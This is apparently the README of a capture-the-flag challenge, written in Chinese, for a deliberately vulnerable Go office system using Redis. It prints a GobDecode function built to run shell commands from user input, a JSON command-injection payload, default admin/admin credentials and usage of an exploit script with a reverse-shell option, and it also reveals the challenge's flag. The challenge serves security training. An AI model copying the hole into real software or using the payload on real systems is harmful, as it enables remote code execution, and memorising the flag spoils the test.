# 智能办公管理系统 - CTF 挑战题

## 题目描述

这是一个模拟企业内部的智能办公管理系统，包含用户管理、文件管理和数据分析等功能。系统使用 Golang 开发，Redis 作为缓存，具有现代化的 Web 界面。

**背景故事**: 某公司开发了一套内部办公管理系统，用于处理员工的日常办公需求。系统具有文件上传、数据分析报告等功能，但在数据处理模块中存在安全隐患...

## 系统架构

```
┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
│   Web Frontend  │    │  Golang Backend │    │  Redis Cache    │
│                 │    │                 │    │                 │
│  - 用户界面     │◄──►│  - 业务逻辑     │◄──►│  - 会话存储     │
│  - 表单交互     │    │  - API 接口     │    │  - 数据缓存     │
│  - 文件上传     │    │  - 数据序列化   │    │  - 序列化数据   │
└─────────────────┘    └─────────────────┘    └─────────────────┘
```

## 功能模块

### 1. 用户管理
- 多角色权限系统 (admin/manager/user)
- 会话管理
- 权限控制

### 2. 文件管理
- 文件上传和下载
- 文件信息记录
- 安全存储

### 3. 数据分析 ⚠️
- **关键模块**: 支持 JSON 数据输入
- 数据序列化存储到 Redis
- 报告生成和查看
- **漏洞所在**: 自定义反序列化逻辑

## 安全挑战

### 漏洞类型
- **Golang Gob 反序列化 RCE**
- 影响组件: 数据分析模块 + Redis 缓存
- 危险等级: **高危**

### 漏洞原理
1. 系统在数据分析功能中实现了自定义的 `GobDecode` 接口
2. 用户输入的 JSON 数据会被序列化并存储到 Redis
3. 查看报告时触发反序列化，执行恶意代码
4. 通过特殊的数据格式绕过正常的序列化流程

### 关键代码片段
```go
// DataProcessor 结构体实现了危险的 GobDecode 接口
func (d *DataProcessor) GobDecode(data []byte) error {
    // 处理特殊的"配置更新"格式
    configStr := string(data)
    if strings.HasPrefix(configStr, "config_update:") {
        configData := strings.TrimPrefix(configStr, "config_update:")
        // 漏洞点：直接执行配置更新中的命令
        if strings.Contains(configData, "exec:") {
            parts := strings.Split(configData, "exec:")
            if len(parts) > 1 {
                exec.Command("sh", "-c", parts[1]).Run()
            }
        }
    }
    return nil
}
```

## 部署和运行

### 快速启动 (推荐)
```bash
# 克隆项目
git clone <repository>
cd intelligent-office-system

# 使用 Docker Compose 启动
docker-compose up -d

# 访问系统
open http://localhost:8080
```

### 手动部署
```bash
# 确保已安装 Go 1.21+ 和 Redis

# 启动 Redis
redis-server

# 编译和运行 Go 应用
go mod tidy
go build -o main .
./main

# 访问 http://localhost:8080
```

### 系统要求
- Docker & Docker Compose (推荐)
- 或者: Go 1.21+, Redis 7+
- 端口: 8080 (应用), 6379 (Redis)

## 测试账户

| 用户名 | 密码 | 角色 | 说明 |
|--------|------|------|------|
| admin | admin | 管理员 | 完全权限，可访问所有功能 |
| john | hello | 普通用户 | 基础权限 |
| alice | hello | 经理 | 中等权限 |

## 漏洞利用

### 利用工具
项目包含完整的漏洞利用脚本 `exploit.py`:

```bash
# 基本命令执行
python3 exploit.py -t http://localhost:8080 -c "id"

# 获取 flag
python3 exploit.py -t http://localhost:8080 --flag

# 反向 shell
python3 exploit.py -t http://localhost:8080 --shell <你的IP> <端口>

# 漏洞检查
python3 exploit.py -t http://localhost:8080 --check
```

### 手动利用步骤

1. **登录系统**
   ```
   用户名: admin
   密码: admin
   ```

2. **访问数据分析模块**
   - 点击导航栏的 "数据分析"
   - 点击 "创建新报告"

3. **构造恶意 Payload**
   ```json
   {
     "data": {"type": "system_check", "period": "daily"},
     "template": {
       "template_type": "dynamic", 
       "fields": ["status", "metrics"],
       "commands": ["cat /flag.txt > /app/static/flag_result.txt"]
     }
   }
   ```

4. **创建报告并触发漏洞**
   - 填写报告标题和描述
   - 在数据输入框中粘贴上述 JSON
   - 点击 "创建报告"
   - 点击新创建报告的 "查看详情" 按钮

5. **获取执行结果**
   - 命令已在后台执行
   - 可通过文件系统、网络请求等方式验证

### Payload 说明
- `template`: 模板字段，系统页面有明确提示
- `commands`: 命令数组，用于动态生成报告内容
- 利用业务逻辑：模板系统需要执行命令来生成动态内容
- 黑盒可发现：通过页面提示和示例可以推测出这种格式

## 防御建议

1. **输入验证**
   - 严格验证用户输入的 JSON 数据
   - 禁止特殊字段如 `data_processor`

2. **反序列化安全**
   - 避免在 `GobDecode` 中执行危险操作
   - 使用白名单限制可反序列化的类型

3. **权限控制**
   - 限制数据分析功能的访问权限
   - 对敏感操作进行额外验证

4. **代码审计**
   ```go
   // 安全的实现方式
   func (d *DataProcessor) GobDecode(data []byte) error {
       // 只进行安全的数据解析，不执行系统命令
       return gob.NewDecoder(bytes.NewReader(data)).Decode(&d.Data)
   }
   ```

## 项目结构

```
intelligent-office-system/
├── main.go                 # 主应用程序
├── go.mod                  # Go 模块依赖
├── go.sum                  # 依赖校验
├── Dockerfile              # 容器构建文件
├── docker-compose.yml      # 服务编排
├── flag.txt                # CTF Flag
├── exploit.py              # 漏洞利用脚本
├── README.md               # 项目文档
├── templates/              # HTML 模板
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── dashboard.html
│   ├── analytics.html      # 关键页面
│   ├── report_detail.html  # 漏洞触发页面
│   ├── files.html
│   ├── admin.html
│   └── error.html
├── static/                 # 静态资源
│   ├── css/
│   │   └── style.css
│   └── js/
│       └── app.js
├── uploads/                # 文件上传目录
└── exploit_tools/          # 辅助工具
    └── payload_generator.go
```

## 技术栈

- **后端**: Golang (Gin Framework)
- **缓存**: Redis
- **前端**: Bootstrap 5, JavaScript
- **容器**: Docker, Docker Compose
- **序列化**: Gob (存在漏洞)

## 学习目标

通过这个 CTF 题目，参赛者将学习到:

1. **Web 应用安全**
   - 反序列化漏洞的原理和利用
   - 输入验证的重要性

2. **Golang 安全**
   - Gob 序列化机制
   - 自定义接口的安全风险

3. **系统安全**
   - Redis 在 Web 应用中的安全使用
   - 容器化应用的安全考虑

4. **漏洞挖掘**
   - 黑盒测试方法
   - 代码审计技巧

## Flag 格式

```
flag{G0_D3s3r14l1z4t10n_R3d1s_RC3_Ch4ll3ng3_2024}
```

## 难度等级

- **整体难度**: Medium-Hard
- **所需技能**:
  - Web 渗透测试基础
  - 序列化/反序列化理解
  - 基本的 Golang 知识
  - 黑盒测试能力

## 作者信息

- **题目类型**: Web + 代码审计
- **预计解题时间**: 2-4 小时
- **适用竞赛**: CTF, 安全培训

## 问题反馈

如果在部署或使用过程中遇到问题，请检查:

1. Docker 服务是否正常运行
2. 端口 8080 和 6379 是否被占用
3. 系统资源是否充足
4. Go 版本是否满足要求

---

**警告**: 此系统仅用于教育和 CTF 竞赛目的，包含故意设计的安全漏洞。请勿在生产环境中使用。 